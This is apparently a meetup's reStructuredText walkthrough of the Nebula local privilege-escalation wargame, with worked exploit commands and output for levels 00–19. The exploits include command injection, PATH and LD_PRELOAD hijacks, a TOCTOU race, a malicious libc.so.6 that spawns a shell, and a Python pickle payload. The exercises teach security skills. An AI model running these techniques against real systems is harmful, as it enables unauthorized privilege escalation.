@@ -1,0 +1,628 @@
+.. include:: /pentest_links.txt
+
+.. _Nebula:
+
+************************
+Exploit Exercises Nebula
+************************
+
+This is to document the meetup's efforts responding to the challenge `Exploit Exercises Nebula <http://exploit-exercises.com/nebula>`_. Nebula intends to teach the basics of local privilege escalation.
+
+Don't spend too much time on any one exercise - peek to get a hint. For the most part, the solutions are relatively easy if you understand the concepts.  If you don't get it then there's either some simple error or unknown concept that is an impediment. In both cases that's not worth hours flailing away - your goal is to learn new concepts efficiently. In fact, it appears level11 no longer has a solution. You also may find level15, level17, and level18 (at least parts of it) challenging.
+
+
+`Nebula Level 00 <http://exploit-exercises.com/nebula/level00>`_
+================================================================
+
+Download and run the nebula vm, logging in with level00/level00.
+
+.. code-block:: console
+
+   level00@nebula:~$ find / -perm /g+s -user flag00 2>/dev/null
+   /bin/.../flag00
+   /rofs/bin/.../flag00
+   level00@nebula:~$ /bin/.../flag00
+   Congrats, now run getflag to get your flag!
+   flag00@nebula:~$ getflag
+   You have successfully executed getflag on a target account
+   flag00@nebula:~$ 
+
+
+`Nebula Level 01 <http://exploit-exercises.com/nebula/level01>`_
+================================================================
+
+Run the nebula vm, logging in with level01/level01.
+
+.. code-block:: console
+
+   level01@nebula:~$ echo getflag > echo
+   level01@nebula:~$ chmod +x echo
+   level01@nebula:~$ PATH=/home/level01:$PATH /home/flag01/flag01
+   You have successfully executed getflag on a target account
+   level01@nebula:~$ 
+
+
+`Nebula Level 02 <http://exploit-exercises.com/nebula/level02>`_
+================================================================
+
+Run the nebula vm, logging in with level02/level02.
+
+.. code-block:: console
+
+   level02@nebula:~$ USER="; getflag; echo " /home/flag02/flag02
+   about to call system("/bin/echo ; getflag; echo  is cool")
+   
+   You have successfully executed getflag on a target account
+   is cool
+   level02@nebula:~$ 
+
+
+`Nebula Level 03 <http://exploit-exercises.com/nebula/level03>`_
+================================================================
+
+Run the nebula vm, logging in with level03/level03.
+
+.. code-block:: console
+
+   level03@nebula:~$ cat > ~flag03/writable.d/runme.sh <<EOF
+   #!/usr/bin/env bash
+   cp /bin/getflag /home/flag03/
+   chmod 4777 /home/flag03/getflag
+   EOF
+   level03@nebula:~$ # ... wait for cronjob to run ...
+   level03@nebula:~$ /home/flag03/getflag
+   You have successfully executed getflag on a target account
+   level03@nebula:~$ 
+
+
+`Nebula Level 04 <http://exploit-exercises.com/nebula/level04>`_
+================================================================
+
+Run the nebula vm, logging in with level04/level04.
+
+.. code-block:: console
+
+   level04@nebula:~$ ln -s /home/flag04/token bypass
+   level04@nebula:~$ /home/flag04/flag04 bypass
+   06508b5e-8909-4f38-b630-fdb148a848a2
+   level04@nebula:~$ # use this as password for su
+   level04@nebula:~$ su - flag04 -c getflag
+   Password: 06508b5e-8909-4f38-b630-fdb148a848a2
+   You have successfully executed getflag on a target account
+   level04@nebula:~$ 
+
+
+
+`Nebula Level 05 <http://exploit-exercises.com/nebula/level05>`_
+================================================================
+
+Run the nebula vm, logging in with level05/level05.
+
+.. code-block:: console
+
+   level05@nebula:~$ tar -xzvf ~flag05/.backup/backup-19072011.tgz
+   level05@nebula:~$ ssh flag05@nebula
+   The authenticity of host 'nebula (127.0.0.1)' can't be established.
+   ECDSA key fingerprint is ea:8d:0:1d:f1:69:e6:1e:55:c7:ec:e9:76:a1:37:f0.
+   Are you sure you want to continue connecting (yes/no)? yes
+   ...
+   flag05@nebula:~$ getflag
+   You have successfully executed getflag on a target account
+   flag05@nebula:~$ 
+
+
+`Nebula Level 06 <http://exploit-exercises.com/nebula/level06>`_
+================================================================
+
+Run the nebula vm, logging in with level06/level06.
+
+.. code-block:: console
+
+   level06@nebula:~$ grep flag06 /etc/passwd | cut -d: -f 2
+   ueqwOCnSGdsuM
+   level06@nebula:~$ # Go offline with a password cracker and get "hello"
+   level06@nebula:~$ su - flag06 -c getflag
+   Password: hello
+   You have successfully executed getflag on a target account
+   level06@nebula:~$ 
+
+
+`Nebula Level 07 <http://exploit-exercises.com/nebula/level07>`_
+================================================================
+
+Run the nebula vm, logging in with level07/level07.
+
+.. code-block:: console
+
+   level07@nebula:~$ wget -q -O - \
+       http://nebula:7007/?Host=www.google.com%3B%20getflag | \
+       grep getflag
+   You have successfully executed getflag on a target account
+   flag07@nebula:~$ 
+
+
+`Nebula Level 08 <http://exploit-exercises.com/nebula/level08>`_
+================================================================
+
+Run the nebula vm, logging in with level08/level08.
+
+
+.. code-block:: none
+
+   level08@nebula:~$ # The only interesting file seems to be ~flag08/capture.pcap
+   level08@nebula:~$ ls -laR ~flag08
+   /home/flag08:
+   total 14
+   drwxr-x--- 2 flag08 level08   86 2012-08-19 03:07 .
+   drwxr-xr-x 1 root   root      60 2012-08-27 07:18 ..
+   -rw-r--r-- 1 flag08 flag08   220 2011-05-18 02:54 .bash_logout
+   -rw-r--r-- 1 flag08 flag08  3353 2011-05-18 02:54 .bashrc
+   -rw-r--r-- 1 root   root    8302 2011-11-20 21:22 capture.pcap
+   -rw-r--r-- 1 flag08 flag08   675 2011-05-18 02:54 .profile
+   level08@nebula:~$ # break traffic into separate flows
+   level08@nebula:~$ tcpflow -q -r capture.pcap
+   level08@nebula:~$ # look at outbound traffic for level 8 passwords
+   level08@nebula:~$ od -c 059.233.235.218.39247-059.233.235.223.12121
+   ###################### SNIP ######################
+   0000260 374   "   l   e   v   e   l   8  \r   b   a   c   k   d   o   o
+   0000300   r 177 177 177   0   0   R   m   8 177   a   t   e  \r
+   0000316
+   level08@nebula:~$ # There goes "backdoo" DEL DEL DEL "00Rm8" DEL "ate"
+   level08@nebula:~$ # = "backd00Rmate" after applying DEL's
+   level08@nebula:~$ su - flag08 -c getflag
+   Password: backd00Rmate
+   You have successfully executed getflag on a target account
+   level08@nebula:~$ 
+
+
+
+`Nebula Level 09 <http://exploit-exercises.com/nebula/level09>`_
+================================================================
+
+Run the nebula vm, logging in with level09/level09. If you run ``objdump -M intel S ~flag09/flag09 > code.txt`` and ``objdump -j .rodata -S ~flag09/flag09 > rodata.txt`` you'll see that ``~flag09/flag09`` does ``setuid(geteuid())`` then calls ``execve()`` to run ``/usr/bin/php -f /home/flag09/flag09.php`` with *PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin* and *PS1=wibblywobblytimeywimeystuff$*. So don't get any smart ideas about playing with the PATH or running a substitute ``~flag09/flag09``. See `e (PREG_REPLACE_EVAL) <http://php.net/manual/en/reference.pcre.pattern.modifiers.php>`_ for an example of PHP code injection for ``preg_replace``.
+
+
+.. code-block:: console
+
+   level09@nebula:~$ echo '[email {${`getflag`}}]' > exploit
+   level09@nebula:~$ ~flag09/flag09 exploit dont_use_me
+   PHP Notice:  Undefined variable: You have successfully executed getflag on a target account
+    in /home/flag09/flag09.php(15) : regexp code on line 1
+
+   level09@nebula:~$ 
+
+
+`Nebula Level 10 <http://exploit-exercises.com/nebula/level10>`_
+================================================================
+
+Run the nebula vm, logging in with level10/level10. First we point out an apparently unintended "solution" which shows a "bug" in the nebula level10 setup: there's a file *x* that has the flag10 password in it:
+
+
+.. code-block:: console
+
+   level10@nebula:~$ ls
+   x
+   level10@nebula:~$ strings x
+   615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
+   level10@nebula:~$ su - flag10 -c getflag
+   Password: 615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
+   You have successfully executed getflag on a target account
+   level10@nebula:~$ 
+
+OK - let's figure out the real solution. First the obvious things. The level10 description points to `access(2) <http://linux.die.net/man/2/access>`_ which has the huge hint:
+
+  Warning: Using access() to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because the user might exploit the short time interval between checking and opening the file to manipulate it. For this reason, the use of this system call should be avoided.
+
+Second obvious thing based on the prior levels is that *~flag10/token* is what we're after.
+
+Combining these, we're going to run ``~flag10/flag10 safe 127.0.0.1`` where *safe* starts out as something level10 can access but is changed to become ``ln -s ~flag10/token safe``. So sometime immediately after the attempt to connect to port 18211, *safe* must be changed to reference *~flag10/token*. We choose to use ``socat`` to connect to port 18211 because it can run a script (to switch *safe*) in response to a connection (and we'll make it spawn a new task for each connection):
+
+.. code-block:: console
+
+   level10@nebula:~$ echo ".oO Oo." > safe
+   level10@nebula:~$ cp safe capture
+   level10@nebula:~$ cat > capture18211.sh <<EOF
+   #!/usr/bin/env bash
+   cd /home/level10
+   rm -f safe
+   ln -s ~flag10/token safe
+   cat - >capture
+   rm -f safe
+   echo ".oO Oo." >safe
+   EOF
+   level10@nebula:~$ chmod +x capture18211.sh
+   level10@nebula:~$ socat tcp4-listen:18211,bind=127.0.0.1,reuseaddr,fork \
+       EXEC:/home/level10/capture18211.sh
+     
+In another window we'll try running ``~flag10/flag10 safe 127.0.0.1`` in a loop to see if ``socat ... EXEC:/home/level10/capture18211.sh`` is fast enough to switch *safe* to ``ln -s ~flag10/token safe``:
+
+.. code-block:: console
+
+   level10@nebula:~$ cat > try.sh <<EOF
+   #!/usr/bin/env bash
+   while [ \$(grep -v "oO Oo." capture | wc -l) -eq 0 ] ; do
+     ~flag10/flag10 safe 127.0.0.1
+   done
+   EOF
+   level10@nebula:~$ chmod +x try.sh
+   level10@nebula:~$ ./try.sh
+   Connecting to 127.0.0.1:18211 .. Connected!
+   Sending file .. wrote file!
+   level10@nebula:~$ cat capture
+   .oO Oo.
+   615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
+   level10@nebula:~$ su - flag10 -c getflag
+   Password: 615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
+   You have successfully executed getflag on a target account
+   level10@nebula:~$ 
+
+With only 1 try it worked. Now if it didn't work in lots of attempts we could try using ``nice -n 19 ./try.sh`` to slow down ``~flag10/flag10 ...``.
+
+
+`Nebula Level 11 <http://exploit-exercises.com/nebula/level11>`_
+================================================================
+
+Run the nebula vm, logging in with level11/level11.
+
+This one can't be solved in the intended manner. If you run ``objdump -M intel -S ~flag11/flag11 > code.txt`` you'll see that the purported source file for this one is not the actual code for ``~flag11/flag11``. That is, the running ``~flag11/flag11`` program's function ``process()`` calls ``setgid(getgid())`` and ``setuid(getuid())`` prior to running ``system()``. ``getuid()`` gets the real uid while ``setuid()`` sets the effective uid, making the ``system()`` call run as level11. So ``getflag`` cannot successfully be run by exploiting the ``system()`` call. Booo - a waste of time. You can search the web for "solutions", but if you actually run them they won't work - something changed since they posted their solution.
+
+If the code were as given in the problem description, then the following would work (after running a number of times because a buffer is uninitialized and we must wait until we get byte 2 of buf to be zero).
+
+
+.. code-block:: console
+
+   level11@nebula:~$ cat > input <<EOF
+   Content-Length: 1
+   B
+   EOF
+   level11@nebula:~$ ln -s /bin/getflag C
+   level11@nebula:~$ # Run until 2nd byte of buf is 0.
+   level11@nebula:~$ PATH=/home/level11:$PATH ~flag11/flag11 < input
+   sh: $'C\360\256': command not found
+   level11@nebula:~$ PATH=/home/level11:$PATH ~flag11/flag11 < input
+   getflag is executing on a non-flag account, this doesn't count
+
+Yes, we know that if you produce a buffer of length 1024 instead of 1 you can avoid that problem, but we want to spend as little time as possible on this broken problem.
+
+On a side note we'll explain something that is left out of other web attempts at this problem. You see that the ``process()`` function mangles your input, so you can't just place "getflag" in the input. You have to create input that when mangled gives you "getflag", in essense computing the inverse of ``process()``. Here is the key part of ``process()``:
+
+.. code-block:: c
+
+   for(i = 0; i < length; i++) {
+     buffer[i] ^= key;
+     key -= buffer[i];
+   }
+
+So how to reverse this? If you start with buffer b[0], b[1], ... you also have implicity key = k[0], k[1], ... where k[i+1] = k[i] - b[i]^k[i]. (NOTE - the "C" code in ``key -= buffer[i];`` uses ``buffer[i]`` which already has ``^=key`` applied to it, so that's where the formula for k[i+1] has the k[i] on the right side.) Say we run ``process()`` producing B[0], B[1], ... and implicity K[0] = k[0], K[1], ... . How do we compute the inverse?
+
+Clearly B[0] = b[0] ^ k[0] = b[0] ^ K[0], so applying (^ K[0]) to both sides gets us B[0] ^ K[0] = b[1].
+
+Next, following ``process()`` B[1] = b[1] ^ (k[0] - b[0] ^ k[0]), substituting B[0] on the right we get B[1] = b[1] ^ (K[0] - B[0]) or (applying "^ (K[0] - B[0])" to both sides) B[1] ^ (K[0] - B[0]) = b[1].
+
+So then the inverse computation code is slightly different as shown below. (NOTE - the "C" code in ``key -= buffer[i] ^ key;`` uses ``buffer[i]`` which already has ``^=key`` applied to it, and we need the *original* buffer[i], so we have to apply a second ``^ key`` to it below. Remember, *buffer[i] ^ key ^ key = buffer[i]*.)
+
+.. code-block:: c
+
+   for(i = 0; i < length; i++) {
+     buffer[i] ^= key;
+     key -= buffer[i] ^ key;
+   }
+
+
+`Nebula Level 12 <http://exploit-exercises.com/nebula/level12>`_
+================================================================
+
+Run the nebula vm, logging in with level12/level12.
+
+
+.. code-block:: console
+
+   level12@nebula:~$ nc 127.0.0.1 50001
+   Password: `getflag` > /tmp/getflag
+   Better luck next time
+   level12@nebula:~$ cat /tmp/getflag
+   You have successfully executed getflag on a target account
+
+
+`Nebula Level 13 <http://exploit-exercises.com/nebula/level13>`_
+================================================================
+
+Run the nebula vm, logging in with level13/level13. The easy way is to run the program via ``gdb``, setting a breakpoint where the uid check is made so you can force it to the desired 1000, thus getting the output token.
+
+
+.. code-block:: console
+
+   level13@nebula:~$ objdump -M intel -S ~flag13/flag13 > code.txt
+   level13@nebula:~$ # Read code.txt, see 0x80484f4 checks uid = 1000 = 0x3e8
+   level13@nebula:~$ gdb ~flag13/flag13
+   ###################### SNIP ######################
+   (gdb) b *0x80484f4
+   Breakpoint 1 at 0x80484f4
+   (gdb) run
+   Starting program: /home/flag13/flag13 
+
+   Breakpoint 1, 0x080484f4 in main ()
+   (gdb) set $eax=0x3e8
+   (gdb) c
+   Continuing.
+   your token is b705702b-76a8-42b0-8844-3adabbe5ac58
+   [Inferior 1 (process 4167) exited with code 063]
+   (gdb) quit
+   level13@nebula:~$ su - flag13 -c getflag
+   Password: b705702b-76a8-42b0-8844-3adabbe5ac58
+   You have successfully executed getflag on a target account
+   level13@nebula:~$ 
+
+Another interesting solution is from `Level 13 in Nebula Solutions - All Levels <http://forelsec.blogspot.com/2013/03/nebula-solutions-all-levels.html>`_. Here, you replace the ``getuid()`` function by preloading a shared library whose ``getuid()`` always returns 1000. You have to remember that since ~flag13/flag13 is setuid you can't just slip in another library, but must instead make a non-setuid copy. In the end, it's even easier than using gdb above.
+
+
+.. code-block:: console
+
+   level13@nebula:~$ # Get a non-setuid copy of ~flag13/flag13
+   level13@nebula:~$ cp ~flag13/flag13 .
+   level13@nebula:~$ # Preload an altered getuid()
+   level13@nebula:~$ cat > getuid.c <<EOF
+   #include <unistd.h>
+   uid_t getuid() { return 1000; }
+   EOF
+   level13@nebula:~$ gcc -shared -o getuid.so getuid.c
+   level13@nebula:~$ LD_PRELOAD=./getuid.so ./flag13
+   your token is b705702b-76a8-42b0-8844-3adabbe5ac58
+   level13@nebula:~$ su - flag13 -c getflag
+   Password: b705702b-76a8-42b0-8844-3adabbe5ac58
+   You have successfully executed getflag on a target account
+   level13@nebula:~$ 
+
+`Nebula Level 14 <http://exploit-exercises.com/nebula/level14>`_
+================================================================
+
+Run the nebula vm, logging in with level14/level14.
+
+
+.. code-block:: none
+
+   level14@nebula:~$ # See how many characters in token (= 37)
+   level14@nebula:~$ wc -c ~flag14/token
+   37 /home/flag14/token
+   level14@nebula:~$ # Lazy so try 37 A's to see how encryption works
+   level14@nebula:~$ python -c \
+       "import os; os.system('echo ' + 37*'A' + ' | ~flag14/flag14 -e')"
+   ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcde/
+   level14@nebula:~$ 
+   level14@nebula:~$ # Looks like adds n to byte position n, n=0, ...
+   level14@nebula:~$ cat > decrypt.py <<EOF
+   #!/usr/bin/env python
+   token = '857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW.'
+   pw = ""
+   for i, c in enumerate(token):
+       pw = pw + chr(ord(token[i]) - i)
+   print(pw)
+   EOF
+   level14@nebula:~$ python decrypt.py
+   8457c118-887c-4e40-a5a6-33a25353165
+   level14@nebula:~$ su - flag14 -c getflag
+   Password: 8457c118-887c-4e40-a5a6-33a25353165
+   You have successfully executed getflag on a target account
+   level14@nebula:~$ 
+
+
+`Nebula Level 15 <http://exploit-exercises.com/nebula/level15>`_
+================================================================
+
+Run the nebula vm, logging in with level15/level15.
+
+This is difficult as it requires knowledge about shared libraries that many security wanna-be's don't have (like me). But then again, the purpose of doing these challenges is to learn, and learn you will with this one. The following 2 solution efforts are well worth reading: `v0id s3curity Exploit Exercise - RPATH Vulnerability <http://v0ids3curity.blogspot.com/2012/10/exploit-exercise-rpath-vulnerability.html>`_ and `Louis Li Nebula Shell Exploits (Solutions 15-19) <http://louisrli.github.io/blog/2012/08/17/nebula2/>`_ (but stop reading after level15, otherwise you might ruin the learning experience with 16 - 19).
+
+This one starts off with looking for "anything out of the ordinary", which for someone not familiar with shared libraries could be just about anything in the output :) The majority of output is about "No such file" in *open("/var/tmp/flag15/...") = -1 ...*. Looking at ``ls -laR /var/tmp/level15`` we see it's empty and owned by level15 - prime for injecting code through a shared library. After many twists and turns followed by consulting the above links, here is a relatively short (not simple) solution. First look at the .dynsym section for libc routines to inject:
+
+.. code-block:: console
+
+   level15@nebula:~$ readelf --dyn-syms ~flag15/flag15
+
+   Symbol table '.dynsym' contains 5 entries:
+      Num:    Value  Size Type    Bind   Vis      Ndx Name
+        0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND 
+        1: 00000000     0 FUNC    GLOBAL DEFAULT  UND puts@GLIBC_2.0 (2)
+        2: 00000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
+        3: 00000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2.0 (2)
+        4: 080484cc     4 OBJECT  GLOBAL DEFAULT   15 _IO_stdin_used
+
+After a personal false start of ``puts()``, ``__libc_start_main@GLIBC_2.0`` is the routine to inject: it's called first and we can ``execve()`` to get a shell. There are 2 stumbling blocks:
+
+  #. Specifying the "GLIBC_2.0" part of ``__libc_start_main@GLIBC_2.0``
+     
+     ``gcc`` has a *--version-script* option where you can specify "GLIBC_2.0".
+     
+  #. Linking in the rest of libc (since you're not replacing all of libc).
+     
+     That was solved by two ``gcc``/``ld`` static linking options: first *-static-libgcc* which uses the static libgcc, then the linker option *-Bstatic* to avoid dynamically linking against shared libraries (remember we can't dynamically use the real ``libc``).
+
+Here goes an amazingly short solution from the v0id and Louis Li links above:
+
+.. code-block:: console
+
+   level15@nebula:~$ # GLIBC_2.0 part of __libc_start_main@GLIBC_2.0
+   level15@nebula:~$ echo 'GLIBC_2.0 { };' > version
+   level15@nebula:~$ # libc.c source needs __libc_start_main routine
+   level15@nebula:~$ #   which will run a flag15 shell
+   level15@nebula:~$ cat > libc.c <<EOF
+   #include<stdlib.h>
+   #define SHELL "/bin/sh"
+   
+   int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
+   {
+     char *file = SHELL;
+     char *argv[] = {SHELL,0};
+     setresuid(geteuid(),geteuid(), geteuid());
+     execve(file,argv,0);
+   }
+   EOF
+   level15@nebula:~$ #  Create static shared library that uses static-libgcc
+   level15@nebula:~$ #    this is key to avoiding errors
+   level15@nebula:~$ gcc -shared -static-libgcc \
+       -Wl,--version-script=version,-Bstatic  libc.c -o libc.so.6
+   level15@nebula:~$ mv libc.so.6 /var/tmp/flag15/
+   level15@nebula:~$ ~flag15/flag15
+   sh-4.2$ # Show running as flag15 and getflag
+   sh-4.2$ id
+   uid=984(flag15) gid=1016(level15) groups=984(flag15),1016(level15)
+   sh-4.2$ getflag
+   You have successfully executed getflag on a target account
+   sh-4.2$ exit
+   exit
+   level15@nebula:~$ 
+
+
+
+`Nebula Level 16 <http://exploit-exercises.com/nebula/level16>`_
+================================================================
+
+Run the nebula vm, logging in with level16/level16.
+
+I personally wasted a lot of time trying to use `Extended Patterns (?{...}) <http://perldoc.perl.org/perlre.html#Extended-Patterns>`_. The idea is that in the web code ``$pw =~ $password`` you could execute some code by passing in *(?{system("/bin/getflag > /tmp/proof.txt")})*. But by default this is not allowed and you have to have something like ``use re 'eval';`` added to the source to allow this to happen. And I can't do that.
+
+It turns out the actual solution is much simpler and focuses on the source code ``... `egrep "^$username" /home/flag16/userdb.txt 2>&1`;``. There are 2 problems to solve. First everything is translated to upper case and text after blanks are stripped off. So the exploit will involve running /tmp/GETFLAG. But we have to work around the /tmp part by letting the shell figure it out: ``ls /*/GETFLAG``. Here goes a solution:
+
+
+.. code-block:: console
+
+   level16@nebula:~$ echo "/bin/getflag > /tmp/getflag.txt" > /tmp/GETFLAG
+   level16@nebula:~$ chmod +x /tmp/GETFLAG 
+   level16@nebula:~$ wget -O wget.txt \
+       http://127.0.0.1:1616/index.cgi?username='`/*/GETFLAG`'
+   ###################### SNIP ######################
+
+   level16@nebula:~$ cat /tmp/getflag.txt 
+   You have successfully executed getflag on a target account
+   level16@nebula:~$ 
+
+
+`Nebula Level 17 <http://exploit-exercises.com/nebula/level17>`_
+================================================================
+
+Run the nebula vm, logging in with level17/level17.
+
+`pickle() <https://docs.python.org/2/library/pickle.html#>`_ allows arbitrary code injection. After you are done with the relatively simple exploit below, you may wish to go back and read some of these: `Exploiting Misuse of Python's "Pickle" <https://blog.nelhage.com/2011/03/exploiting-pickle/>`_, `Arbitrary code execution with Python pickles <http://cs.jhu.edu/~s/musings/pickle.html>`_, and `Sour Pickles whitepaper <http://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_WP.pdf>`_ with `Sour Pickles slides <https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf>`_.
+
+To get the pickle input text for an exploit by hand takes some effort, but the `__reduce__() <https://docs.python.org/2/library/pickle.html#pickling-and-unpickling-extension-types>`_ method does the heavy lifting for us. Basically, you can create an exploit class with only the ``__reduce__()`` method returning a tuple with between 2 and 5 elements (but we only use 2 here). The first element is a callable object which is our exploit (like ``os.system()`` to run a shell command). The second element is another tuple of the arguments for the first object (like ``/bin/getflag > /tmp/getflag.txt``). So when the target unpickles the exploit, the first element is executed using the second element, giving us ``os.system('/bin/getflag > /tmp/getflag.txt')`` and we have our exploit.
+
+
+.. code-block:: console
+
+   level17@nebula:~$ # Code to pickle a call to /bin/getflag via __reduce__ method
+   level17@nebula:~$ cat >getflag.py <<EOF
+   import pickle
+   import os
+   class Getflag(object):
+       def __reduce__(self):
+           return (os.system, ('/bin/getflag > /tmp/getflag.txt',))
+   print(pickle.dumps(Getflag()))
+   EOF
+   level17@nebula:~$ # See what the pickle text looks like
+   level17@nebula:~$ python getflag.py
+   cposix
+   system
+   p0
+   (S'/bin/getflag > /tmp/getflag.txt'
+   p1
+   tp2
+   Rp3
+   .
+   level17@nebula:~$ # Run it and verify execution
+   level17@nebula:~$ python getflag.py | socat - tcp:127.0.0.1:10007
+   Accepted connection from 127.0.0.1:45989level17@nebula:~$ cat /tmp/getflag.txt 
+   You have successfully executed getflag on a target account
+   level17@nebula:~$ 
+
+
+
+
+`Nebula Level 18 <http://exploit-exercises.com/nebula/level18>`_
+================================================================
+
+Run the nebula vm, logging in with level18/level18.
+
+There are at least 3 workable exploits with this level's program:
+
+  #. You can choose the log file to be the password file, thus setting it to a known value which you can use to login. We show that solution here.
+  
+  #. The ``login()`` function still sets the user as logged in when ``fp = fopen(PWFILE, "r");`` return fails - so use up all available file pointers to force a login without a password. We show `3nvisi0n <http://pastebin.com/u/3nvisi0n>`_'s solution below.
+  
+  #. There is a format string vulnerability when the *site exec* command calls the ``notsupported()`` function. See `Exploit Exercise - Format String FORTIFY_SOURCE Bypass <http://v0ids3curity.blogspot.com/2012/09/exploit-exercise-format-string.html>`_ for the complex, instructional solution. Alternatively, look at `Level 18 in Nebula Solutions - All Levels <http://forelsec.blogspot.com/2013/03/nebula-solutions-all-levels.html>`_ for another approach.
+  
+  #. The *setuser* command calls ``setuser()`` which uses ``sprintf()`` which can buffer overflow *char msg[128];*. But `checksec.sh`_ shows the program has NX enabled and a stack canary, making that probably a dead end.
+
+Here we exploit problem (1). Setting the log file option to be the password file via ``~flag18/flag18 -d ~flag18/password`` sets the password to the log message "Starting up. Verbose level = 0\\n" (note the trailing "\\n"). So we know the password. But when entering the password via the command "login ...", the trailing "\\n" is stripped causing the password check to fail. To work around this set the byte immediately after "login" to "\\0" and the trailing "\\n" will be preserved.
+
+
+.. code-block:: console
+
+   level18@nebula:~$ # Set password to "Starting up. Verbose level = 0\n"
+   level18@nebula:~$ cat /dev/null | ~flag18/flag18 -d /home/flag18/password
+   level18@nebula:~$ # Put NULL after "login" so password has trailing "\n"
+   level18@nebula:~$ echo -ne \
+       "login\0Starting up. Verbose level = 0\nshell\n" \
+       > exploit.txt
+   level18@nebula:~$ cat exploit.txt - | ~flag18/flag18
+   getflag
+   You have successfully executed getflag on a target account
+   exit
+
+   level18@nebula:~$ 
+
+
+For the curious, we reproduce `3nvisi0n's Exploit-Exercises Nebula Solutions <http://pastebin.com/WjJTmQxH>`_ attack against problem (2) above (using python). If 1025 logins doesn't do the trick for you, bump up 1025 until it does.
+
+.. code-block:: console
+
+   level18@nebula:~$ python -c 'print "login AAAAAAA\n"*1025' > /home/level18/pl
+   level18@nebula:~$ printf "closelog\nshell\n" >> /home/level18/pl
+   level18@nebula:~$ cat ~/pl | ~flag18/flag18 --init-file -d /dev/tty
+   /home/flag18/flag18: invalid option -- '-'
+   /home/flag18/flag18: invalid option -- 'i'
+   /home/flag18/flag18: invalid option -- 'n'
+   /home/flag18/flag18: invalid option -- 'i'
+   /home/flag18/flag18: invalid option -- 't'
+   /home/flag18/flag18: invalid option -- '-'
+   /home/flag18/flag18: invalid option -- 'f'
+   /home/flag18/flag18: invalid option -- 'i'
+   /home/flag18/flag18: invalid option -- 'l'
+   /home/flag18/flag18: invalid option -- 'e'
+   Starting up. Verbose level = 0
+   logged in successfully (without password file)
+   logged in successfully (without password file)
+   logged in successfully (without password file)
+   logged in successfully (without password file)
+   logged in successfully (without password file)
+   getflag
+   You have successfully executed getflag on a target account
+   exit
+   level18@nebula:~$ 
+
+
+`Nebula Level 19 <http://exploit-exercises.com/nebula/level19>`_
+================================================================
+
+Run the nebula vm, logging in with level19/level19.
+
+This one requires knowing how to get a process with a root parent process: fork a process, make the child an orphan by having the parent terminate immediately, child delays a bit giving the init process time to become the new parent. Then running ~flag19/flag19 in the child gets a root shell.
+
+
+.. code-block:: console
+
+   level19@nebula:~$ cat > orphan.c <<EOF
+   #include <unistd.h>
+   int main() {
+     int pid = fork();
+     if (pid == 0) { // the child
+       sleep(5);
+       execl("/home/flag19/flag19", "/bin/sh", "-c", \
+             "/bin/getflag > /tmp/getflag.txt", NULL);
+     }
+   }
+   EOF
+   level19@nebula:~$ gcc -o orphan orphan.c
+   level19@nebula:~$ ./orphan
+   level19@nebula:~$ cat /tmp/getflag.txt
+   You have successfully executed getflag on a target account
+   level19@nebula:~$ 
